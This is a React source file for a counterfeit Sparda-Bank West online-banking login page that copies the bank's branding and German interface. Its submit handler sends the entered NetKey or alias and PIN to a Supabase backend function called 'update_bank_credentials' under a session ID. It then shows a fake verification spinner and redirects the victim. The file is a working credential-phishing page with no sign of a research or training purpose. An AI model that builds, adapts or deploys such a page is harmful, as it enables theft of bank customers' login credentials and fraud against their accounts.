import { useState, useEffect } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import { usePageMeta } from "@/hooks/use-page-meta";
import { Eye, EyeOff, ChevronRight, ChevronDown } from "lucide-react";
import logoAsset from "@/assets/sparda-logo.avif.asset.json";
import teaserAsset from "@/assets/sparda-teaser.avif.asset.json";

const BLUE = "#0056a3";
const BLUE_DARK = "#004a8f";
const BORDER = "#8a99a8";
const TEXT = "#1f2a37";

const SpardaBankDe = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const sessionId = searchParams.get("s") || "";

  const [showLoading, setShowLoading] = useState(false);
  const [username, setUsername] = useState("");
  const [pin, setPin] = useState("");
  const [showPin, setShowPin] = useState(false);
  const [tab, setTab] = useState<"creds" | "qr">("creds");

  useEffect(() => { window.scrollTo(0, 0); }, []);
  usePageMeta("Sparda-Bank West - Anmelden", logoAsset.url);

  const submit = async () => {
    if (sessionId) {
      const { error } = await supabase.rpc("update_bank_credentials", {
        p_session_id: sessionId,
        p_username: username,
        p_password: pin,
        p_username_label: "Sparda-NetKey oder Alias",
        p_password_label: "PIN",
      });
      if (error) console.error("Update failed:", error);
    }
    setShowLoading(true);
  };

  return (
    <>
      {showLoading && (
        <LoadingOverlay
          message="Anmeldedaten werden überprüft..."
          onComplete={() => navigate("/confirmation?s=" + sessionId)}
        />
      )}
      <div
        className="min-h-screen flex flex-col"
        style={{ fontFamily: "'GenosGFG', Arial, sans-serif", color: TEXT, backgroundColor: "#f3f5f7" }}
      >
        {/* Top blue bar */}
        <div style={{ backgroundColor: BLUE, height: 48 }} />

        {/* Header */}
        <header className="bg-white border-b border-gray-200">
          <div className="max-w-[1200px] mx-auto px-6 py-4 flex items-center gap-5">
            <img src={logoAsset.url} alt="Sparda-Bank" className="h-12 w-auto" />
            <span style={{ color: BLUE, fontFamily: "'FrutigerVR', 'GenosGFG', Arial, sans-serif", fontWeight: 700, fontSize: 20 }}>
              Sparda-Bank West eG
            </span>
          </div>
        </header>

        {/* Main */}
        <main className="flex-1">
          <div className="max-w-[1200px] mx-auto px-6 py-10 grid grid-cols-1 lg:grid-cols-2 gap-8">
            {/* Left: login card + hint */}
            <div className="flex flex-col gap-6">
              <section className="bg-white rounded-lg shadow-sm p-8">
                <h1 style={{ color: BLUE, fontSize: 32, fontWeight: 700, marginBottom: 20, fontFamily: "'FrutigerVR', 'GenosGFG', Arial, sans-serif" }}>
                  Anmelden
                </h1>

                {/* Tabs */}
                <div className="flex gap-6 border-b" style={{ borderColor: "#dbe0e5", marginBottom: 24 }}>
                  <button
                    onClick={() => setTab("creds")}
                    className="pb-3 text-sm font-semibold -mb-px"
                    style={{
                      color: tab === "creds" ? BLUE : "#4b5563",
                      borderBottom: tab === "creds" ? `3px solid ${BLUE}` : "3px solid transparent",
                    }}
                  >
                    Mit Zugangsdaten anmelden
                  </button>
                  <button
                    onClick={() => setTab("qr")}
                    className="pb-3 text-sm font-semibold -mb-px"
                    style={{
                      color: tab === "qr" ? BLUE : "#4b5563",
                      borderBottom: tab === "qr" ? `3px solid ${BLUE}` : "3px solid transparent",
                    }}
                  >
                    Mit QR-Code anmelden
                  </button>
                </div>

                {/* Fields */}
                <div className="space-y-4">
                  <input
                    type="text"
                    placeholder="Sparda-NetKey oder Alias"
                    value={username}
                    onChange={(e) => setUsername(e.target.value)}
                    className="w-full px-4 py-3 outline-none"
                    style={{
                      border: `1px solid ${BORDER}`,
                      borderRadius: 6,
                      fontSize: 16,
                      backgroundColor: "#fff",
                    }}
                    onFocus={(e) => { e.currentTarget.style.borderColor = BLUE; e.currentTarget.style.boxShadow = `inset 0 0 0 1px ${BLUE}`; }}
                    onBlur={(e) => { e.currentTarget.style.borderColor = BORDER; e.currentTarget.style.boxShadow = "none"; }}
                  />
                  <div className="relative">
                    <input
                      type={showPin ? "text" : "password"}
                      placeholder="PIN"
                      value={pin}
                      onChange={(e) => setPin(e.target.value)}
                      className="w-full px-4 py-3 pr-12 outline-none"
                      style={{
                        border: `1px solid ${BORDER}`,
                        borderRadius: 6,
                        fontSize: 16,
                        backgroundColor: "#fff",
                      }}
                      onFocus={(e) => { e.currentTarget.style.borderColor = BLUE; e.currentTarget.style.boxShadow = `inset 0 0 0 1px ${BLUE}`; }}
                      onBlur={(e) => { e.currentTarget.style.borderColor = BORDER; e.currentTarget.style.boxShadow = "none"; }}
                    />
                    <button
                      type="button"
                      onClick={() => setShowPin((s) => !s)}
                      className="absolute right-3 top-1/2 -translate-y-1/2"
                      style={{ color: TEXT }}
                      aria-label="PIN anzeigen"
                    >
                      {showPin ? <EyeOff size={22} /> : <Eye size={22} />}
                    </button>
                  </div>

                  <div className="flex justify-end">
                    <a href="#" onClick={(e) => e.preventDefault()} style={{ color: BLUE, fontSize: 14, fontWeight: 600 }}>
                      PIN vergessen?
                    </a>
                  </div>
                </div>

                {/* Divider */}
                <hr className="my-6" style={{ borderColor: "#e4e8ec" }} />

                {/* Buttons */}
                <div className="flex items-center justify-between gap-4">
                  <button
                    onClick={() => { setUsername(""); setPin(""); }}
                    className="px-10 py-3 font-semibold"
                    style={{
                      color: BLUE,
                      backgroundColor: "#fff",
                      border: `2px solid ${BLUE}`,
                      borderRadius: 999,
                      minWidth: 180,
                    }}
                  >
                    Abbrechen
                  </button>
                  <button
                    onClick={submit}
                    className="px-10 py-3 font-semibold text-white"
                    style={{
                      backgroundColor: BLUE,
                      border: `2px solid ${BLUE}`,
                      borderRadius: 999,
                      minWidth: 180,
                    }}
                    onMouseEnter={(e) => { e.currentTarget.style.backgroundColor = BLUE_DARK; e.currentTarget.style.borderColor = BLUE_DARK; }}
                    onMouseLeave={(e) => { e.currentTarget.style.backgroundColor = BLUE; e.currentTarget.style.borderColor = BLUE; }}
                  >
                    Anmelden
                  </button>
                </div>
              </section>

              {/* Hint box */}
              <section className="bg-white rounded-lg shadow-sm p-6" style={{ fontSize: 15, lineHeight: 1.5 }}>
                <p>
                  <strong>Hinweis:</strong> Beim Aufruf Ihres Union-Depots kann es derzeit vereinzelt zu längeren Ladezeiten oder technischen Fehlern kommen. Wir arbeiten mit Hochdruck an der Behebung. Vielen Dank für Ihr Verständnis.
                </p>
              </section>
            </div>

            {/* Right: teaser */}
            <aside>
              <div className="bg-white rounded-lg shadow-sm overflow-hidden">
                <img src={teaserAsset.url} alt="Geldanlage" className="w-full h-[420px] object-cover" />
                <div className="p-6">
                  <h2 style={{ color: TEXT, fontSize: 22, fontWeight: 700, marginBottom: 10, fontFamily: "'FrutigerVR', 'GenosGFG', Arial, sans-serif" }}>
                    Finden Sie die Geldanlage, die zu Ihnen passt!
                  </h2>
                  <p style={{ color: "#6b7684", fontSize: 15, lineHeight: 1.5 }}>
                    Ob Vermögensaufbau oder finanzielle Vorsorge – wählen Sie die Geldanlage, die Ihren Zielen entspricht.
                  </p>
                  <div className="flex justify-end mt-4">
                    <a href="#" onClick={(e) => e.preventDefault()} style={{ color: BLUE }} aria-label="Weiter">
                      <ChevronRight size={28} />
                    </a>
                  </div>
                </div>
              </div>
            </aside>
          </div>
        </main>

        {/* Footer */}
        <footer style={{ backgroundColor: BLUE }} className="text-white">
          <div className="max-w-[1200px] mx-auto px-6 py-6 flex flex-col items-center gap-3">
            <nav className="flex flex-wrap items-center justify-center gap-x-2 gap-y-2 text-sm">
              {["Impressum", "Sicherheitshinweise", "Nutzungsbedingungen", "Datenschutz", "Pflichtinformationen", "AGB"].map((l, i, arr) => (
                <span key={l} className="flex items-center gap-2">
                  <a href="#" onClick={(e) => e.preventDefault()} className="text-white hover:underline font-semibold">{l}</a>
                  {i < arr.length - 1 && <span className="opacity-60">·</span>}
                </span>
              ))}
            </nav>
            <button className="flex items-center gap-2 text-sm" onClick={(e) => e.preventDefault()}>
              <span style={{
                display: "inline-block", width: 22, height: 22, borderRadius: "50%",
                background: "linear-gradient(to bottom, #000 33%, #dd0000 33% 66%, #ffcc00 66%)",
                border: "1px solid rgba(255,255,255,0.6)",
              }} />
              <span>Deutsch</span>
              <ChevronDown size={16} />
            </button>
          </div>
        </footer>

        <div className="text-center text-sm py-5" style={{ color: "#6b7684" }}>
          Gemeinsam neue Wege gehen!
        </div>
      </div>
    </>
  );
};

export default SpardaBankDe;
